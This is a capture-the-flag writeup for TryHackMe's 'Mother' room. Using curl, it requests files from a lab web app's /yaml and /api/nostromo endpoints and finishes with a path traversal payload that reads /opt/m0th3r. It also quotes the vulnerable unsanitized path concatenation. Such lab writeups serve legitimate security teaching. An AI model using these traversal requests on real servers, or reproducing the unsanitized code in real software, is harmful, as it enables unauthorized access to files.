# Mother

A writeup for the room [Mother](https://tryhackme.com/room/codeanalysis) on TryHackMe.

> Exploit flaws found in Mother's code to reveal its secrets.

<Image src={require("./logo.png").default} width="256" />

### What is the number of the emergency command override?

It is written in the description of the room.

### What is the special order number?

If we go to the home page, we can see different boxes that explain a little what the application can do. We are logged in as "Crew Member" without any permissions.

<Image src={require("./1-homepage.webp").default} />

<Image src={require("./2-classified.webp").default} />

We can see that there is a tool called Alien Loader that allows to upload yaml files to the server. It is the same tool described in the room description.

Since Alien Loader allows us to upload yaml files, we can try to use the available endpoint for yaml files to download 100375.yaml

<Image src={require("./3-yaml.webp").default} />

Run this command to make the request (remember to change the IP):

```bash
curl -X POST -d '{"file_path":"100375.yaml"}' -H "Content-Type: application/json" MACHINE_IP/yaml
```

The response will contain the special order number.

```
FOR SCIENCE OFFICER EYES ONLY  special SECRETS:  REROUTING TO: api/nostromo ORDER: 0rd3rXYZ.txt [****]
UNABLE TO CLARIFY. NO FURTHER ENHANCEMENT.
```

Now we know the number of the special order.

Be careful with the paths, the yaml endpoint is directly under root, while the Nostromo ones are under /api.

```
POST /yaml
POST /api/nostromo
POST /api/nostromo/mother

{
  "file_path": "path/to/file"
}
```

### What is the hidden flag in the Nostromo route?

The flag can be obtained by downloading the special order file from the nostromo endpoint.

<Image src={require("./4-nostromo.webp").default} />

The request:

```bash
curl -X POST -d '{"file_path":"0rd3r937.txt"}' -H "Content-Type: application/json" MACHINE_IP/api/nostromo
```

The result:

```
Mother
FOR SCIENCE OFFICER EYES ONLY 
SPECIAL ORDER 937 [............

PRIORITIY 1 ****** ENSURE RETURN OF ORGANISM FOR ANALYSIS****]

ALL OTHER CONSIDERATIONS SECONDARY

CREW EXPENDABLE

Flag{--REDACTED--}
```

### What is the name of the Science Officer with permissions?

After calling the previous endpoints, we can see that the username at the top of the homepage has changed.

<Image src={require("./5-ash.webp").default} />

### What are the contents of the classified "Flag" box?

Now that we are logged in as Ash when we go to the flag section we can finally see the contents of the classified box.

### Where is Mother's secret?

In the description of the room, it is indicate that the goal is to obtain the file secret.txt in the mother folder.

Now that we have activated the two other endpoints for authentication, we can try to call the mother one.

```bash
curl -X POST -d '{"file_path":"../../../../../opt/m0th3r"}' -H "Content-Type: application/json" MACHINE_IP/api/nostromo/mother
```

This will return the contents of the secret.txt file.

### What is Mother's secret?

All endpoints implemented in the routes file, including the mother endpoint, are vulnerable to path traversal. 

The user can insert any value and it will be concatenated to the base path without any sanitization.

```js
let file_path = req.body.file_path;
const filePath = `./public/${file_path}`;
```

So, if we send something like ../../../../../opt/m0th3r the value of filePath will be:

```
./public/../../../../../opt/m0th3r -> /opt/m0th3r
```

Send this request for the final flag:

```bash
curl -X POST -d '{"file_path":"../../../../../opt/m0th3r"}' -H "Content-Type: application/json" MACHINE_IP/api/nostromo/mother
```
